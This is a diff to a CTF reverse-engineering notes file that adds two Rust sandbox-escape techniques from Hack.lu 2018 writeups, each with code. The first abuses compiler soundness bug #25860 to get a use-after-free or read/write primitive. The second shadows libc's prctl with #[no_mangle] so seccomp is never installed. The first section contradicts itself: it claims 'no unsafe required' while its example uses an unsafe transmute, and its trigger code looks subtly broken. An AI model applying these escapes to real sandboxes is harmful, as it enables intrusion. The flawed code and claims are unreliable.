@@ -14,8 +14,10 @@
   - [Symbol Demangling](#symbol-demangling)
   - [Common Rust Patterns in Decompilation](#common-rust-patterns-in-decompilation)
   - [Rust-Specific Analysis Tools](#rust-specific-analysis-tools)
+  - [Rust Lifetime Escape via Compiler Bug #25860 (Hack.lu 2018)](#rust-lifetime-escape-via-compiler-bug-25860-hacklu-2018)
+  - [Rust #[no_mangle] libc Override for seccomp Bypass (Hack.lu 2018)](#rust-no_mangle-libc-override-for-seccomp-bypass-hacklu-2018)
 - [Swift Binary Reversing](#swift-binary-reversing)
-- [Kotlin / JVM Binary Reversing](#kotlin-jvm-binary-reversing)
+- [Kotlin / JVM Binary Reversing](#kotlin--jvm-binary-reversing)
   - [JVM Bytecode (Android/Server)](#jvm-bytecode-androidserver)
   - [Kotlin/Native](#kotlinnative)
 - [D Language Binary Reversing (CSAW CTF 2016)](#d-language-binary-reversing-csaw-ctf-2016)
@@ -569,3 +571,55 @@ std::map<K,V>:
 std::unordered_map<K,V>:
   Hash table: {bucket_array, size, load_factor_max, ...}
 ```
+
+---
+
+### Rust Lifetime Escape via Compiler Bug #25860 (Hack.lu 2018)
+
+**Pattern:** Rust compiler bug rust-lang/rust#25860 — higher-ranked lifetime variance was checked incorrectly, so a closure could "reborrow" a reference and unsoundly extend its lifetime to `'static`. In a Rust-only sandbox that runs safe code (no `unsafe` block) this bug yields a UAF primitive: alias a `Vec<u8>` heap buffer as a `(usize, usize, usize)` tuple and read/write past its end.
+
+```rust
+// Triggering pattern — safe Rust only
+fn extend<'a, 'b, T>(_: &'a &'b (), v: &'b T) -> &'a T { v }
+
+fn bad<T>(v: T) -> &'static T {
+    // Closure infers 'a = 'static because of the variance bug
+    let f: fn(&'_ &'_ (), &'_ T) -> &'_ T = extend;
+    f(&&(), &v) // returned ref now outlives v
+}
+
+fn main() {
+    let aliased: &'static Vec<u8> = bad(vec![1u8, 2, 3]);
+    // Reinterpret the Vec as its raw header: (ptr, len, cap)
+    let header: &(usize, usize, usize) =
+        unsafe { std::mem::transmute(aliased) };
+    println!("ptr={:#x} len={} cap={}", header.0, header.1, header.2);
+}
+```
+
+**Key insight:** A single soundness bug in the borrow checker turns a sandboxed Rust playground into an arbitrary-read-write primitive — no `unsafe` required. When a Rust CTF bans `unsafe` and pins a specific compiler version, grep the rust-lang issue tracker for `soundness` bugs fixed after that version: each one is an exploitation candidate. Repro this family with `std::mem::transmute` only after you have a lifetime-extended reference; the alias is the hard part.
+
+**References:** Hack.lu CTF 2018 — Rusty CodePad, writeup 11859
+
+---
+
+### Rust #[no_mangle] libc Override for seccomp Bypass (Hack.lu 2018)
+
+**Pattern:** A sandboxed Rust binary calls `prctl(PR_SET_SECCOMP, ...)` early in `main`, then drops to user code. Because the sandboxed crate is *linked statically* alongside libc, defining an `extern "C"` function named `prctl` with `#[no_mangle]` shadows libc's symbol at link time. Returning `0` from the override disables seccomp, leaving every syscall reachable from the attacker's code.
+
+```rust
+// User-supplied code — linked into the same binary as the sandbox harness
+#[no_mangle]
+pub extern "C" fn prctl(_a: i64, _b: i64) -> i64 {
+    0 // pretend success, do not install any filter
+}
+
+// When main() calls prctl(PR_SET_SECCOMP, ...) it hits our override
+fn main() {
+    // The real program runs without seccomp filtering
+}
+```
+
+**Key insight:** Rust's static-linking default means `extern "C"` + `#[no_mangle]` is effectively a dynamic hook at compile time — any libc symbol the sandbox harness calls (`prctl`, `chroot`, `seteuid`, `read`) can be redefined by attacker crate code that ships inside the same binary. Harden by routing syscalls through `libc::syscall(SYS_prctl, ...)` directly (which bypasses the symbol table) or by using `-Wl,-Bsymbolic` to prefer the intended definitions.
+
+**References:** Hack.lu CTF 2018 — Rusty CodePad seccomp variant, writeup 11864
